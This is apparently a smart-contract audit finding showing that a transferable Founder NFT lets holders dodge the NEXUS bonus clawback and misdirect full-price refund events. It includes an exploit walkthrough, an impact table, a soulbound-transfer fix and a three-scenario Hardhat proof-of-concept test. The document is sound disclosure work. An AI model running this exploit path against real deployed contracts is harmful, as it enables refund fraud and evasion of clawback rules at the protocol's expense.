# Founder NFT Transferability Breaks Cancellation Authorization - NEXUS Clawback Evasion & Refund Misdirection

## Summary

`TCGVaultFounderNFT` inherits plain `ERC721` with **no `_update` override**, unlike every other NFT/token in this repo (`TCGVaultBasicNFT`, `TCGNexusToken`, `TCGRToken`), so Founder NFTs are **freely transferable**. `cancelFounderPurchase()` authorizes on the *current* holder (`ownerOf(tokenId)`) and claws back NEXUS from *that caller's own balance* not the original buyer's while still emitting a full-price refund-due event keyed to that caller.

```solidity
// TCGVaultFounderNFT.sol
contract TCGVaultFounderNFT is ERC721, Ownable2Step, ReentrancyGuard {   // line 20 - no soulbound _update override

function cancelFounderPurchase(uint256 tokenId) external nonReentrant {
    if (msg.sender != ownerOf(tokenId)) revert Unauthorized();          // line 186 - current holder, not buyer
    ...
    uint256 usdcRefundDue = _usdcPriceForToken[tokenId];                // line 196 - ORIGINAL price paid by buyer
    uint256 nexusClawedBack = _nexusBonusForToken[tokenId];             // line 197 - ORIGINAL bonus minted to buyer
    _burn(tokenId);
    if (nexusClawedBack > 0) {
        uint256 nexusBalance = IERC20(address(_nexusToken)).balanceOf(msg.sender);  // line 203 - CALLER's balance
        actualNexusBurned = nexusClawedBack > nexusBalance ? nexusBalance : nexusClawedBack;
        if (actualNexusBurned > 0) _nexusToken.clawBackPresaleBonus(msg.sender, actualNexusBurned);
    }
    ...
    emit FounderPurchaseCancelled(msg.sender, tokenId, usdcRefundDue, actualNexusBurned); // line 214 - keyed to CALLER
}
```

**Exploit path:**
1. Alice `mint()`s a Founder NFT, pays 200/350 USDC, receives 30% NEXUS bonus to her own (soulbound) balance.
2. Because the NFT is a plain transferable ERC721, Alice sends it to Bob - an alt wallet she controls, or a third party. `_purchasedAt[tokenId]` is untouched by the transfer, so the 14-day `CANCEL_WINDOW` travels with the token.
3. Bob calls `cancelFounderPurchase(tokenId)`. Authorization passes (`ownerOf == Bob`). NEXUS is soulbound (`TCGNexusToken._update` reverts on any non-mint/burn transfer), so Bob cannot possibly hold Alice's bonus the clawback burns `min(nexusClawedBack, balanceOf(Bob))`, which is `0` if Bob has no unrelated NEXUS of his own.
4. `FounderPurchaseCancelled(Bob, tokenId, 200e6, 0)` fires. Off-chain CASP reconciliation reads this event and processes a refund tied to Bob for the full original price, while Alice's NEXUS bonus is never touched.

This was reproduced end-to-end against the deployed contract (PoC test suite, 3/3 passing) not just traced statically.

## Impact

| # | Actor | On-chain cost | On-chain gain | Off-chain consequence |
|---|-------|---------------|----------------|------------------------|
| A | Original buyer (Alice) transfers to her own alt wallet, then cancels from there | 1 NFT transfer (gas only) | Keeps 30% NEXUS bonus **permanently** | Refund-due event still fires (for whichever wallet calls cancel) buyer can still trigger/collect a refund while keeping the governance bonus |
| B | Unrelated third party (Bob) buys/receives a near-expiry Founder NFT cheaply or for free on secondary market | Price paid to Alice on secondary market (can be ≪ 200/350 USDC, or 0 if gifted) | Nothing on-chain besides the NFT | `usdcRefundDue` event keyed to Bob for the **full original price** (200 or 350 USDC) exploitable if CASP's off-chain reconciliation trusts the emitted `buyer` address |
| — | Protocol / NEXUS supply | — | — | Clawback is silently skipped whenever the calling holder's NEXUS balance is insufficient (frequently `0`), so the "claw back the bonus on cancellation" invariant is bypassable at will |

**Scale:** up to 490 paid Founder NFTs × up to 350 USDC = **171,500 USDC** in refund-due events that can be misdirected via this path if all cancellations within the 14-day window route through transferred tokens. Actual realized exposure depends on off-chain CASP's reconciliation logic (whether it trusts the emitted `buyer` field verbatim, cross-checks against original payment records, or requires manual review) this is a smart-contract-level integrity break in the event data regardless of whether the off-chain process happens to catch it downstream.

**Root cause class:** MiCA cooling-off / clawback invariant violation the contract cannot guarantee "the NEXUS bonus granted for a purchase is clawed back when that purchase is cancelled," because clawback target and refund target are derived from `msg.sender`/`ownerOf` instead of the recorded buyer.

## Mitigation

**Enforce soulbound transfers**, matching the pattern already used by `TCGVaultBasicNFT`, `TCGNexusToken`, and `TCGRToken`. This closes both the transfer-to-evade-clawback path (A) and the secondary-market path (B) at the root, since `ownerOf(tokenId)` can then never diverge from the original buyer:

```solidity
function _update(address to, uint256 tokenId, address auth)
    internal
    override
    returns (address)
{
    address from = _ownerOf(tokenId);
    if (from != address(0) && to != address(0)) {
        revert SoulboundTransferNotAllowed();
    }
    return super._update(to, tokenId, auth);
}
```

## POC


```ts
import { describe, it, before } from "node:test";
import { expect } from "chai";
import hre from "hardhat";
import { getAddress, getContractAddress } from "viem";
import type { ContractReturnType } from "@nomicfoundation/hardhat-viem/types";

const { viem, networkHelpers } = await hre.network.connect();


async function deployIsolatedPresaleStack(
  deployer: Awaited<ReturnType<typeof viem.getWalletClients>>[0],
  usdcAddr: `0x${string}`,
) {
  const publicClient = await viem.getPublicClient();
  const from = deployer.account.address;
  const n0 = BigInt(await publicClient.getTransactionCount({ address: from, blockTag: "pending" }));
  const mockAddr = getContractAddress({ from, nonce: n0 });
  const nexusAddr = getContractAddress({ from, nonce: n0 + 1n });
  const founderAddr = getContractAddress({ from, nonce: n0 + 2n });
  const launchAddr = getContractAddress({ from, nonce: n0 + 3n });

  const mockTcgv = await viem.deployContract("contracts/test/MockTCGVPresale.sol:MockTCGVPresale", [], {
    client: { wallet: deployer },
  });
  if (mockTcgv.address.toLowerCase() !== mockAddr.toLowerCase()) {
    throw new Error("MockTCGV nonce mismatch");
  }
  await viem.deployContract("TCGNexusToken", [mockAddr, founderAddr, launchAddr], { client: { wallet: deployer } });
  const founder = await viem.deployContract(
    "TCGVaultFounderNFT",
    [usdcAddr, nexusAddr, deployer.account.address],
    { client: { wallet: deployer } },
  );
  const launch = await viem.deployContract(
    "TCGVaultInitialLaunch",
    [mockAddr, usdcAddr, founder.address, nexusAddr, deployer.account.address],
    { client: { wallet: deployer } },
  );
  const tcgvC = await viem.getContractAt("MockTCGVPresale", mockAddr);
  await tcgvC.write.setInitialLaunch([launchAddr], { account: deployer.account });
  return {
    mockTcgv: tcgvC,
    nexus: await viem.getContractAt("TCGNexusToken", nexusAddr),
    founder: await viem.getContractAt("TCGVaultFounderNFT", founder.address),
    launch: await viem.getContractAt("TCGVaultInitialLaunch", launch.address),
  };
}

describe("BUG: TCGVaultFounderNFT.cancelFounderPurchase clawback/refund tied to current holder, not buyer", () => {
  let owner: Awaited<ReturnType<typeof viem.getWalletClients>>[0];
  let alice: Awaited<ReturnType<typeof viem.getWalletClients>>[0]; // original buyer
  let bob: Awaited<ReturnType<typeof viem.getWalletClients>>[0];   // NFT recipient / secondary buyer
  let usdc: ContractReturnType<"MockUSDC">;

  const WAVE1_PRICE = 200 * 1e6; // 200 USDC, 6 decimals

  before(async () => {
    [owner, alice, bob] = await viem.getWalletClients();
    // Real 6-decimal MockUSDC (contracts/test/MockUSDC.sol) - open mint(), matches
    // production USDC decimals exactly, so WAVE1_PRICE (200 * 1e6) is a true 200 USDC.
    const mockUsdc = await viem.deployContract("MockUSDC", [], { client: { wallet: owner } });
    usdc = await viem.getContractAt("MockUSDC", mockUsdc.address);
    // fund alice and bob with plenty of mock USDC (6 decimals: 1_000 * 1e6 = 1,000 USDC)
    await usdc.write.mint([alice.account.address, 1_000n * 10n ** 6n], { account: owner.account });
    await usdc.write.mint([bob.account.address, 1_000n * 10n ** 6n], { account: owner.account });
  });

  it("SCENARIO A: original buyer transfers NFT away, then the NEW holder's cancellation burns the wrong (or zero) NEXUS while an original-buyer-priced refund event still fires", async () => {
    const { founder, nexus } = await deployIsolatedPresaleStack(owner, usdc.address as `0x${string}`);

    // Alice buys Founder NFT #0 for 200 USDC in wave 1, gets 30% NEXUS bonus.
    await usdc.write.approve([founder.address, BigInt(WAVE1_PRICE)], { account: alice.account });
    await founder.write.mint({ account: alice.account });

    const tokenId = 0n;
    const aliceNexusAfterMint = await nexus.read.balanceOf([alice.account.address]);
    expect(aliceNexusAfterMint > 0n).to.equal(true); // sanity: Alice did receive the NEXUS bonus
    expect(await founder.read.ownerOf([tokenId])).to.equal(getAddress(alice.account.address));

    // Alice transfers the "soulbound-in-spirit" Founder NFT to Bob. This should NOT be
    // possible if the NFT enforced soulbound transfers like TCGVaultBasicNFT/TCGNexusToken
    // do, but TCGVaultFounderNFT never overrides _update(), so this succeeds.
    await founder.write.transferFrom([alice.account.address, bob.account.address, tokenId], {
      account: alice.account,
    });
    expect(await founder.read.ownerOf([tokenId])).to.equal(getAddress(bob.account.address));

    // Bob (who has 0 NEXUS of his own) cancels within the window.
    const bobNexusBefore = await nexus.read.balanceOf([bob.account.address]);
    expect(bobNexusBefore).to.equal(0n);

    const hash = await founder.write.cancelFounderPurchase([tokenId], { account: bob.account });

    // --- Bug assertion 1: Alice's NEXUS bonus is NEVER clawed back ---
    const aliceNexusAfterCancel = await nexus.read.balanceOf([alice.account.address]);
    expect(aliceNexusAfterCancel).to.equal(aliceNexusAfterMint); // unchanged bonus permanently kept

    // --- Bug assertion 2: actualNexusBurned is 0 because Bob had 0 NEXUS ---
    const publicClient = await viem.getPublicClient();
    const receipt = await publicClient.waitForTransactionReceipt({ hash });
    const logs = await publicClient.getContractEvents({
      address: founder.address,
      abi: founder.abi,
      eventName: "FounderPurchaseCancelled",
      fromBlock: receipt.blockNumber,
      toBlock: receipt.blockNumber,
    });
    expect(logs.length).to.equal(1);
    const args = logs[0]!.args as {
      buyer: string;
      tokenId: bigint;
      usdcRefundDue: bigint;
      nexusClawedBack: bigint;
    };

    expect(args.nexusClawedBack).to.equal(0n); // <-- should have been aliceNexusAfterMint, is 0

    // --- Bug assertion 3: refund event is keyed to Bob, who never paid the 200 USDC ---
    expect(getAddress(args.buyer)).to.equal(getAddress(bob.account.address)); // NOT Alice
    expect(args.usdcRefundDue).to.equal(BigInt(WAVE1_PRICE)); // full original price, refund-eligible on Bob's behalf
  });

  it("SCENARIO B: third party (secondary market) acquires a near-expiry Founder NFT for free and triggers a full-price refund-due event without ever paying USDC", async () => {
    const { founder, nexus } = await deployIsolatedPresaleStack(owner, usdc.address as `0x${string}`);

    // Alice buys Founder NFT #0 for 200 USDC.
    await usdc.write.approve([founder.address, BigInt(WAVE1_PRICE)], { account: alice.account });
    await founder.write.mint({ account: alice.account });
    const tokenId = 0n;

    // Fast-forward close to (but not past) the 14-day cancellation window.
    await networkHelpers.time.increase(14 * 24 * 3600 - 3600); // 13h59 in
    await networkHelpers.mine();

    // Alice gives the NFT away for free (or sells cheaply) to Bob, an uninvolved
    // third party who never sent any USDC to the contract.
    const bobUsdcBefore = await usdc.read.balanceOf([bob.account.address]);
    await founder.write.transferFrom([alice.account.address, bob.account.address, tokenId], {
      account: alice.account,
    });

    // Bob cancels no USDC was ever taken from Bob.
    const hash = await founder.write.cancelFounderPurchase([tokenId], { account: bob.account });
    const bobUsdcAfter = await usdc.read.balanceOf([bob.account.address]);
    expect(bobUsdcAfter).to.equal(bobUsdcBefore); // Bob paid nothing on-chain

    const publicClient = await viem.getPublicClient();
    const receipt = await publicClient.waitForTransactionReceipt({ hash });
    const logs = await publicClient.getContractEvents({
      address: founder.address,
      abi: founder.abi,
      eventName: "FounderPurchaseCancelled",
      fromBlock: receipt.blockNumber,
      toBlock: receipt.blockNumber,
    });
    const args = logs[0]!.args as { buyer: string; tokenId: bigint; usdcRefundDue: bigint };

    // Bug: the off-chain CASP reconciliation event is keyed to Bob for the FULL
    // 200 USDC original price, even though Bob spent 0 USDC acquiring the NFT.
    expect(getAddress(args.buyer)).to.equal(getAddress(bob.account.address));
    expect(args.usdcRefundDue).to.equal(BigInt(WAVE1_PRICE));
  });

  it("Confirms the underlying enabler: Founder NFT transfers are NOT soulbound (no _update restriction)", async () => {
    const { founder } = await deployIsolatedPresaleStack(owner, usdc.address as `0x${string}`);
    await usdc.write.approve([founder.address, BigInt(WAVE1_PRICE)], { account: alice.account });
    await founder.write.mint({ account: alice.account });

    // This transfer should revert if the contract enforced soulbound transfers
    // the way TCGVaultBasicNFT / TCGNexusToken / TCGRToken do. It does not revert.
    await founder.write.transferFrom([alice.account.address, bob.account.address, 0n], {
      account: alice.account,
    });
    expect(await founder.read.ownerOf([0n])).to.equal(getAddress(bob.account.address));
  });
});
```